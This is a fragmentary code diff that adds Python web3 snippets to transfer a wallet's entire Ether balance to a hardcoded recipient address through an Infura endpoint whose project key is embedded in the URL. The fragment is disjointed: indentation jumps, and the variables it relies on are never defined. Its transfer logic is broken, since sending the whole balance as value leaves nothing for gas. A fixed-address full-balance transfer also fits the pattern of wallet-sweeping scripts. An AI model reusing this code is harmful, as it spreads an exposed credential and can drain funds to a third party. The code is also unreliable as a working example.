@@ -1,0 +1,15 @@
+INFURA_URL = 'https://mainnet.infura.io/v3/faf46a11789f43dba8d38843620b1b54'
+
+
+
+    recipient_address = '0x3B4A25503B2133013cefA7A0d35249C8A842BaC0'  # Replace with the recipient's address
+
+    
+    # Prepare the transaction parameters
+    transaction = {
+        'to': recipient_address,
+        'value': balance,  # Send the entire balance
+        'gas': 2000000,
+        'gasPrice': web3.toWei('50', 'gwei'),  # Adjust gas price as necessary
+        'nonce': web3.eth.getTransactionCount(sender_address),
+    }
